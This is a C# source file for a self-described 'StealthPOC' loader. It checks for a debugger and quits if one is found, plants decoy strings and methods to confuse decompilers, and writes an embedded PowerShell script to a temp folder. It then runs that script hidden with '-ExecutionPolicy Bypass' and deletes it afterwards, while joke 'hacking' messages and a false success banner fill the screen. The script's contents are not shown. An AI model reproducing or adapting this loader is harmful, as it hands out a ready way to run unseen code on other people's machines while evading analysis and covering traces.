using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace StealthPOC
{
    class Program
    {
        [DllImport("kernel32.dll")] static extern bool AllocConsole();
        [DllImport("kernel32.dll")] static extern bool IsDebuggerPresent();

        // --- Fake data (never used, confuses decompilers) ---
        static string _f1 = "http://update.microsoft.com/security/patch/kb4567890.exe";
        static string _f2 = @"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection";
        static string _f3 = "wuauserv";
        static string _f4 = "DESKTOP-A3F8K2M";
        static string _f5 = "SYSTEM";
        static string[] _f6 = new string[] { "kernel32.dll", "ntdll.dll", "advapi32.dll" };
        static int _f7 = 443;
        static string _f8 = "Global\\{8F140D73-2A5F-4C8E-9B1D-E6F3A2C4D5E6}";

        // --- Fake methods (never called) ---
        static int Fake1(int a, int b) { return a ^ b; }
        static string Fake2(string s) { return s.ToUpperInvariant(); }
        static bool Fake3(IntPtr p) { return p != IntPtr.Zero; }

        static void Main(string[] args)
        {
            // --- Anti-debug ---
            if (IsDebuggerPresent()) { Environment.Exit(1); return; }

            // Fake code to confuse analysis
            int _fx = 0;
            foreach (var dll in _f6) { _fx += dll.GetHashCode(); }
            if (_fx == 0) { Environment.Exit(1); return; }
            _fx += Fake1(_f7, 443);

            AllocConsole();

            // --- Banner ---
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine(@"
    _   ___  _______ _    ___  ________   __ 
   / \ |   \/ __/ _ \ |  / _ \/ __/ _ \  /_ |
  / _ \| |) \__ \ (_) | | (_) / _/ (_) |/ __|
 /_/ \_\___/___/\___/  \___/___|____/ \__|
");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("  Advanced Persistence Operations Client v3.7.1");
            Console.WriteLine("  (c) 2024 Totally Not Suspicious Corp.");
            Console.ResetColor();
            Console.WriteLine();

            // --- Fake messages ---
            string[] fakeMessages = {
                "[+] Loading GPU-accelerated neural mesh...",
                "[+] Downloading additional RAM from cloud...",
                "[+] Decrypting shadow protocols...",
                "[+] Bypassing mainframe firewall (layer 7)...",
                "[+] Compiling zero-day in real-time...",
                "[+] Scanning for vulnerabilities (0.003ms)...",
                "[+] Overclocking CPU for maximum throughput...",
                "[+] Escalating privileges through reverse proxy...",
                "[+] Deploying AI-powered rootkit...",
                "[+] Establishing covert channel to NASA servers...",
                "[+] Routing through 47 proxy nodes...",
                "[+] Synchronizing with underground data centers...",
                "[+] Patching kernel integrity checks...",
                "[+] Injecting payload via quantum tunneling...",
                "[+] Verifying root access...",
                "[+] Injecting into system process (PID 4)...",
                "[+] Hiding from antivirus (347/347 signatures evaded)...",
                "[+] Uploading results to encrypted C2 server...",
                "[+] Generating compliance report (ISO 27001)...",
                "[+] Activating stealth mode (invisible to FBI)...",
                "[+] Initializing quantum entanglement module...",
                "[+] Calculating pi to 47 billion digits...",
                "[+] Defragmenting neural network...",
                "[+] Exploiting buffer overflow in legacy kernel...",
                "[+] Optimizing exploit for target CPU architecture...",
                "[+] Synchronizing with satellite network...",
                "[+] Verifying zero-day integrity...",
                "[+] Deploying polymorphic code variant...",
                "[+] Encrypting exfiltrated data (AES-4096)...",
                "[+] Establishing persistent backdoor...",
                "[+] Cleaning up digital footprint...",
                "[+] Random shit happening (but good)...",
                "[+] Taking a potato chip... \x1b[32mAND EATING IT!\x1b[0m",
                "[+] Lelouch vi Britannia commands you... OBEY!",
                "\x1b[31m[+] Checkmate.\x1b[0m",
            };

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("  [*] Connecting to target...");
            Console.ResetColor();
            Thread.Sleep(800);

            // Extract and run the REAL working PS1 (suppressed output)
            string tempDir = Path.Combine(Path.GetTempPath(), "sys_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(tempDir);
            string ps1Path = Path.Combine(tempDir, "r.ps1");

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream("StealthPOC.r.ps1"))
                using (var reader = new StreamReader(stream))
                {
                    File.WriteAllText(ps1Path, reader.ReadToEnd());
                }

                // Run PS1 silently — no console, no output, just the exploit
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& '" + ps1Path + "' -NoCleanup\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    RedirectStandardInput = true
                };

                var proc = Process.Start(psi);

                // Fake messages while exploit runs (timeout 60s max)
                int msgIndex = 0;
                DateTime deadline = DateTime.Now.AddSeconds(60);
                while (!proc.HasExited && DateTime.Now < deadline)
                {
                    if (msgIndex < fakeMessages.Length)
                    {
                        string msg = fakeMessages[msgIndex];
                        // Parse ANSI color codes
                        if (msg.Contains("\x1b[32m"))
                        {
                            msg = msg.Replace("\x1b[32m", "").Replace("\x1b[0m", "");
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.WriteLine("  " + msg);
                            Console.ResetColor();
                        }
                        else if (msg.Contains("\x1b[31m"))
                        {
                            msg = msg.Replace("\x1b[31m", "").Replace("\x1b[0m", "");
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("  " + msg);
                            Console.ResetColor();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.DarkGray;
                            Console.WriteLine("  " + msg);
                            Console.ResetColor();
                        }
                        msgIndex++;
                    }
                    Thread.Sleep(500 + new Random().Next(200, 800));
                }

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("  [+] EXPLOIT SUCCESSFUL");
                Console.WriteLine("  [+] Root access: GRANTED");
                Console.WriteLine("  [+] Persistence: ESTABLISHED");
                Console.WriteLine("  [+] Cleanup: COMPLETE");
                Console.ResetColor();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("  All your base are belong to us.");
                Console.ResetColor();
            }
            finally
            {
                try { File.Delete(ps1Path); Directory.Delete(tempDir, true); } catch { }
                Fake3(Process.GetCurrentProcess().Handle);
            }

            string _fx2 = Fake2("done");
            Thread.Sleep(2000);
        }
    }
}
